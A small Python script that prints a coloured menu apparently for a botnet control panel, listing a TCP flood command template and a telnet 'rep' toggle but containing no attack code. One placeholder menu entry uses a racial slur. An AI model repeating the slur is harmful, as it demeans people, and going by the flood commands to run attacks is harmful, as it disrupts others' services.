
def getCommands(theme:str or None=None, about_split:str=': ') -> str:
    '''
    Returns the commands list
    '''

    final = []
    for cmd in [
        ('TCP ip port time 32 all 0 10','tcp'), 
        ('boogaaaaaaaaaaaaaaaaaaaaaaaa','oog'), 
        ('balls','nigga')]:

        name, info = cmd
        if theme == 'senpai':
            line = '\033[36m |\033[97m !* '
            line += '{0: <39}'.format(name)
            line += '\033[36m| '
            line += '{0: <21}'.format(info)
            line += '\033[36m|'
        else:
            line = f'{name}{about_split}{info}'

        final.append(line)    
    return '\n'.join(final)

print("\033[95m[\033[97m+\033[95m]\033[36m----------------------------------------------------------------\033[95m[\033[97m+\033[95m]")
print("\033[36m |\033[97m                         コマンドのメニュー                       \033[36m|")
print(getCommands('senpai'))
print("\033[36m |\033[97m >---\033[35mServerside Commands\033[97m---<               \033[36m|                      \033[36m|")
print("\033[36m |\033[97m !* TELNET \033[32mON \033[31mOFF                          \033[36m| telnet rep           \033[36m|")
print("\033[36m |\033[97m clear                                     \033[36m| clears screen        \033[36m|")
print("\033[36m |\033[97m logout                                    \033[36m| logout               \033[36m|")
print("\033[95m[\033[97m+\033[95m]\033[36m----------------------------------------------------------------\033[95m[\033[97m+\033[95m]")

#print('|'+centerify("Hello, welcome!This is some text that should be centered!")+'|')
#print('|'+centerify("Hello, welcome!\nThis is some text that should be centered!", 80)+'|')